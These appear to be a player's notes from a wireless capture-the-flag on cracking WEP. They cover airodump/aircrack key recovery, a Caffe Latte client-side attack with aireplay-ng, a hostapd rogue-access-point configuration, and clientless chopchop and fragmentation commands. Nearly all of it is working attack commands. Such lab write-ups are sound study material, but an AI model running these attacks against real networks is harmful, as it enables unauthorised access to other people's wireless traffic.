## Classic WEP

Basically run airodump for 10 minutes and aircrack

```
sudo airmon-ng

sudo airmon-ng start wlan27

sudo airodump-ng  -w derp --output-format pcap --band ag wlan27mon

wget https://raw.githubusercontent.com/rfhs/wctf-files/master/wordlist/cyberpunk.words

sudo aircrack-ng -w cyberpunk.words derp0-01.cap
```

## Caffe Latte (WEP, no AP)

How to recognize?
You might find in airodump-ng that there are probes to ESSIDs that aren't found.
This signals a client-side attack


Begin the Caffe Latte Attack by starting an airodump-ng capture and writing the keystream to an output file:
It helps to know the channel, which is more of an art and needs tweaking by playing with airodump to find what the target is looking for.

```
airodump-ng -w cafefile --output-format pcap --band a -c 44 wlan29mon
```

While an airodump-ng capture is running, perform the Caffe-Latte Attack:

to specify the channel, the interface needs to be brought up in airodump with channel specified.

```
aireplay-ng --caffe-latte -h 02:00:00:00:1E:00 -b 00:13:10:30:24:9C -D wlan30mon

    -h is our card MAC address
    -b is the Access Point MAC (any valid MAC should work)
    -D disables AP detection.
```

find our own mac with `iw dev`

^ This didn't work for me at DefCon 2020

According to another member used hostapd instead of aireplay

```
interface=wlan31mon
ssid=WCTF_03
channel=44
hw_mode=a
#mana_wpaout=hostapd.hccapx
wep_default_key=1
wep_key1="abcde"
wep_key_len_broadcast="5"
wep_key_len_unicast="5"
wep_rekey_period=300
auth_algs=3
```

put that into my_ha.conf

hostapd my_ha.conf starts the beacon and the original airodump will capture enough IVs for aircrack



## Client-less WEP

Attempts at "chochop/fragmentation"

```
aireplay-ng -1 0 -e WCTF_02 -a 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -5 -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -4 -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -1 1000 -o 1 -q 10 -e WCTF_02 -a 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
```